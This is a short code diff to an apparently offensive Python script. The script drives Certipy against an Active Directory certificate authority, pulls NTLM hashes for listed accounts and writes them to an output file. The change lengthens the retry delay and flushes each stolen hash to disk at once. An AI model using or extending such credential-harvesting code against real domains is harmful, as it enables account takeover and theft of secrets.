@@ -123,7 +123,7 @@ def get_dc_netbios_from_fqdn(dc_fqdn: str) -> str:
     return dc_netbios_domain
 
 MAX_RETRIES = 3  # Number of retries per account
-RETRY_DELAY = 5  # Delay between retries (in seconds)
+RETRY_DELAY = 60  # Delay between retries (in seconds)
 
 def retrieve_certificates_and_auth(accounts, user, password, dc_ip, dc_fqdn, ca_name, target, template, proxychains, output_file, debug):
     """Retrieve certificates using Certipy with retry mechanism."""
@@ -215,6 +215,7 @@ def retrieve_certificates_and_auth(accounts, user, password, dc_ip, dc_fqdn, ca_
                         try:
                             ntlm_hash = stdout.split('\n')[-1].split(': ')[1]
                             out_file.write(f'{account.domain}\\{account.username}::{ntlm_hash}::: (status=Enabled)\n')
+                            out_file.flush()  # Ensure immediate write to file
                             print((f'{account.domain}\\{account.username}::{ntlm_hash}::: (status=Enabled)\n'))
                         except IndexError:
                             logger.error(f"❌ Error: Failed to parse NTLM hash for {account.username}: {stdout}")
